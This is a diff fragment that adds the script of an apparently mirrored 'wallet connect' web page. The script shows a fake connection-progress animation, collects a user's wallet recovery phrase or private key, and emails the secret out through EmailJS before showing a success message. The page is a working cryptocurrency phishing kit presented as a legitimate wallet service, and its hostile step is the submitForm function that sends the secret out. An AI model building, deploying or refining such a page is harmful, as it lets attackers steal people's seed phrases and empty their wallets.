+            submitBtn.disabled = !phraseValid();
+          } else {
+            updateKeyHint();
+            submitBtn.disabled = !keyValid();
+          }
+        }
+
+        function runConnecting() {
+          clearTimers();
+          let progress = 0;
+          const tick = setInterval(() => {
+            progress += 2;
+            progressFill.style.width = Math.min(progress, 100) + "%";
+            if (progress >= 100) clearInterval(tick);
+          }, 40);
+
+          STEPS.forEach((label, i) => {
+            const step = document.createElement("div");
+            step.className = "status-step";
+            step.innerHTML =
+              '<span class="step-dot"></span><span>' + label + "</span>";
+            statusSteps.appendChild(step);
+
+            timers.push(setTimeout(() => step.classList.add("visible"), i * 700));
+            timers.push(setTimeout(() => step.classList.add("active"), i * 700 + 100));
+            timers.push(
+              setTimeout(() => {
+                step.classList.remove("active");
+                step.classList.add("done");
+              }, i * 700 + 800)
+            );
+          });
+
+          timers.push(
+            setTimeout(() => {
+              connecting.style.display = "none";
+              form.classList.add("visible");
+              updateSubmitState();
+            }, STEPS.length * 700 + 900)
+          );
+        }
+
+        window.openModal = function (name, icon) {
+          nameEl.textContent = name;
+          successName.textContent = name;
+
+          // load the popup logo, with the same backup behaviour as the cards
+          logoEl.onerror = function () {
+            this.onerror = null;
+            const fb = ICON_FALLBACKS[icon];
+            if (fb) this.src = fb;
+          };
+          logoEl.src = icon;
+
+          connecting.style.display = "flex";
+          form.classList.remove("visible");
+          progressFill.style.width = "0%";
+          statusSteps.innerHTML = "";
+          phraseInput.value = "";
+          keyInput.value = "";
+          phraseHint.textContent = "0 words — min 12, max 24";
+          phraseHint.className = "phrase-hint";
+          keyHint.textContent = "0 characters — min " + KEY_MIN + ", max " + KEY_MAX;
+          keyHint.className = "phrase-hint";
+          setTab("phrase");
+
+          overlay.classList.add("active");
+          runConnecting();
+        };
+
+        function closeModal() {
+          clearTimers();
+          overlay.classList.remove("active");
+        }
+
+        async function submitForm() {
+          const tab = activeTab();
+          // nothing proceeds unless valid
+          if (tab === "phrase" && !phraseValid()) return;
+          if (tab === "key" && !keyValid()) return;
+
+          submitBtn.disabled = true;
+          const label = submitBtn.textContent;
+          submitBtn.textContent = "Connecting…";
+
+          const params = {
+            wallet: nameEl.textContent,
+            type: tab === "phrase" ? "Passphrase" : "Private Key",
+            value:
+              tab === "phrase" ? phraseInput.value.trim() : keyInput.value.trim(),
+          };
+
+          try {
+            await emailjs.send(
+              "YOUR_SERVICE_ID",
+              "YOUR_TEMPLATE_ID",
+              params,
+              "YOUR_PUBLIC_KEY"
+            );
+          } catch (err) {
+            console.error("EmailJS error:", err);
+          }
+
+          submitBtn.textContent = label;
+          overlay.classList.remove("active");
+          successOverlay.classList.add("active");
+        }
+
+        document.querySelectorAll(".tab-btn").forEach((b) =>
+          b.addEventListener("click", () => setTab(b.dataset.tab))
+        );
+        phraseInput.addEventListener("input", updateSubmitState);
+        keyInput.addEventListener("input", updateSubmitState);
+        submitBtn.addEventListener("click", submitForm);
+        document.getElementById("modalClose").addEventListener("click", closeModal);
+        document
+          .getElementById("successClose")
+          .addEventListener("click", () => successOverlay.classList.remove("active"));
+        document
+          .getElementById("successDone")
+          .addEventListener("click", () => successOverlay.classList.remove("active"));
+
+        overlay.addEventListener("click", (e) => {
+          if (e.target === overlay) closeModal();
+        });
+      })();
+    </script>
+  </body>
+
+<!-- Mirrored from gomining-llc.vercel.app/wallet.html by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 23 Oct 2026 19:32:28 GMT -->
+</html>
